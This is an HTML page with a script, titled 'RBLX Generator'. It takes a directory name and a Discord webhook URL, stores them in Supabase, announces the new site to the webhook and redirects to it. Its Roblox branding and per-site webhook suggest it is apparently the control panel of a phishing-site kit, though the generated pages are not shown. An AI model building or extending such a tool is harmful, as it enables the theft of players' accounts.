<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RBLX Generator</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: #fff;
            padding: 20px;
        }

        .container {
            width: 100%;
            max-width: 400px;
        }

        h1 {
            text-align: center;
            font-size: 32px;
            font-weight: 700;
            margin-bottom: 30px;
            text-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
        }

        .card {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 30px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(255, 255, 255, 0.2);
        }

        .form-group {
            margin-bottom: 20px;
        }

        input {
            width: 100%;
            padding: 14px 16px;
            border-radius: 10px;
            border: none;
            background: rgba(255, 255, 255, 0.2);
            color: #fff;
            font-size: 15px;
            transition: all 0.3s ease;
        }

        input:focus {
            outline: none;
            background: rgba(255, 255, 255, 0.3);
            box-shadow: 0 0 0 2px rgba(255, 255, 255, 0.5);
        }

        input::placeholder {
            color: rgba(255, 255, 255, 0.7);
        }

        .btn {
            width: 100%;
            padding: 16px;
            border-radius: 10px;
            background: #fff;
            border: none;
            color: #667eea;
            font-weight: 700;
            font-size: 16px;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-bottom: 15px;
        }

        .btn:hover {
            background: #f0f0f0;
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.3);
        }

        .btn:active {
            transform: translateY(0);
        }

        .btn-back {
            background: rgba(255, 255, 255, 0.2);
            color: #fff;
        }

        .btn-back:hover {
            background: rgba(255, 255, 255, 0.3);
        }

        .status {
            margin-top: 15px;
            text-align: center;
            font-size: 14px;
            min-height: 20px;
        }

        .success {
            color: #4CAF50;
        }

        .error {
            color: #ff5b5b;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>üåê RBLX Generator</h1>
        
        <div class="card">
            <div class="form-group">
                <input 
                    type="text" 
                    id="directory" 
                    placeholder="Enter directory name"
                />
            </div>
            
            <div class="form-group">
                <input 
                    type="text" 
                    id="webhook" 
                    placeholder="Enter Discord Webhook URL"
                />
            </div>
            
            <button class="btn" id="generateBtn">Generate</button>
            
            <button class="btn btn-back" id="backBtn">‚Üê Back to Home</button>
            
            <div class="status" id="status"></div>
        </div>
    </div>

    <script type="module">
        import { createClient } from 'https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2.39.0/+esm';

        let supabase;

        async function initSupabase() {
            const response = await fetch('/api/config');
            const config = await response.json();
            
            if (!config.supabaseUrl || !config.supabaseAnonKey) {
                document.getElementById('status').textContent = '‚ö†Ô∏è Supabase not configured. Please set environment variables.';
                document.getElementById('status').className = 'status error';
                document.getElementById('generateBtn').disabled = true;
                return false;
            }
            
            supabase = createClient(config.supabaseUrl, config.supabaseAnonKey);
            return true;
        }

        initSupabase();

        const directoryInput = document.getElementById('directory');
        const webhookInput = document.getElementById('webhook');
        const generateBtn = document.getElementById('generateBtn');
        const backBtn = document.getElementById('backBtn');
        const status = document.getElementById('status');

        backBtn.addEventListener('click', () => {
            window.location.href = '/';
        });

        generateBtn.addEventListener('click', async () => {
            if (!supabase) {
                status.textContent = '‚ö†Ô∏è Supabase not initialized';
                status.className = 'status error';
                return;
            }

            const directory = directoryInput.value.trim();
            const webhook = webhookInput.value.trim();

            if (!directory || !webhook) {
                status.textContent = '‚ö†Ô∏è Please enter both a directory and webhook URL';
                status.className = 'status error';
                return;
            }

            status.textContent = '‚è≥ Creating site...';
            status.className = 'status';
            generateBtn.disabled = true;
            generateBtn.textContent = 'Processing...';

            try {
                const { data, error } = await supabase
                    .from('websites')
                    .insert([{ directory, webhook_url: webhook }]);

                if (error) {
                    status.textContent = '‚ùå Error: ' + error.message;
                    status.className = 'status error';
                    generateBtn.disabled = false;
                    generateBtn.textContent = 'Generate';
                    return;
                }

                try {
                    await fetch(webhook, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            content: `‚úÖ Your site **${directory}** has been successfully created!\\nüåê Visit it here: ${window.location.origin}/${directory}`
                        })
                    });
                } catch (err) {
                    console.error('Webhook send failed', err);
                }

                status.textContent = '‚úÖ Site created successfully!';
                status.className = 'status success';

                setTimeout(() => {
                    window.location.href = `/${directory}`;
                }, 1500);
            } catch (err) {
                status.textContent = '‚ùå Error: ' + err.message;
                status.className = 'status error';
                generateBtn.disabled = false;
                generateBtn.textContent = 'Generate';
            }
        });
    </script>
</body>
</html>
